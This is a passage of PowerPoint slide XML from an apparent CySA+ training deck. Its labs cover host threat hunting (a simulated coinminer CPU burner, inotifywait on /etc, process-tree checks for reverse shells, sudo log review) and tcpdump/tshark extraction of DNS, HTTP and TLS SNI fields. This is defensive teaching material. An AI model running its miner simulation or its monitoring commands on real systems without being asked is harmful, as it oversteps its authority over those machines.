      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Detect abnormal process / CPU consumption (Host-related: "Processor consumption")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Spawn a CPU-burner that mimics a coinminer:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ yes &gt; /dev/null &amp;</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290</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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5 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Detect file-system anomalies (Host-related: "File system changes or anomalies")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Watch a sensitive directory for unexpected writes:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2015109"/>
            <a:ext cx="3977639" cy="5486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52360" y="2015109"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ inotifywait -m -r -e create,modify,delete /etc 2&gt;/dev/null &amp;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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2923794"/>
            <a:ext cx="91440" cy="101269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005840" y="3201543"/>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3201543"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Detect malicious processes via parent / command line (Host-related: "Malicious processes")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A reverse shell often has bash as a child of a network listener:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3155823"/>
            <a:ext cx="3977639" cy="5486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52360" y="3155823"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ps -ef | awk '$3==1 &amp;&amp; $NF ~ /sh$/ {print}'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Detect unauthorised privilege escalation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Multiple UID-0 entries in /etc/passwd, new SUID binaries, or a flood of failed sudo attempts all qualify as "Unauthorized privileges".</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4296537"/>
            <a:ext cx="3977639" cy="5486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52360" y="4296537"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ grep -E 'sudo|su\b' /var/log/auth.log | tail</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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1005840" y="5482971"/>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05840" y="5482971"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Clean up</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5437251"/>
            <a:ext cx="3977639" cy="5486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452360" y="5437251"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ kill %1 %2 2&gt;/dev/null</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291</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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5 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The value of a baseline before hunting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to detect new accounts, cron persistence, CPU abuse, file-system drops, suspicious process trees, and privilege escalation — each mapped to a CySA+ 1.2 indicator.</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292</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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6 — Packet Capture for Threat Hunting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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will capture live traffic with tcpdump, then perform analyst-level extraction with tshark: pulling HTTP host headers, DNS queries, and TLS SNI fields out of a pcap. These are exam-blueprint skills under CySA+ 1.3 (Packet capture — Wireshark, tcpdump).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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293</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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6 — Reference Diagram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g_aa80adb260.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2160344" y="1783080"/>
            <a:ext cx="7868264" cy="4434840"/>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294</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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6 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>When prompted by tshark, answer "No" — non-root packet capture is not needed inside Killercoda.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y tcpdump tshark curl dnsutils</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Capture a known-traffic sample to a pcap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-w writes a pcap, -G 10 -W 1 rotates after 10 seconds and stops.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tcpdump -i any -nn -w /tmp/sample.pcap -G 10 -W 1 &amp;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Extract DNS queries from the pcap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In a threat hunt this is how you spot DGA-style randomised domains, DNS tunnelling, or queries to known-bad domains.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -r /tmp/sample.pcap -Y 'dns.flags.response==0' -T fields -e dns.q</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Extract HTTP host headers and URIs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cleartext HTTP requests reveal command-and-control URLs, downloaded second stages, and exfiltration endpoints.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tshark -r /tmp/sample.pcap -Y http.request -T fields -e http.host -e htt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Extract TLS SNI (server name indicator)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Even when payloads are encrypted, the SNI in the ClientHello tells you which host the client tried to reach — the single most useful field for…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
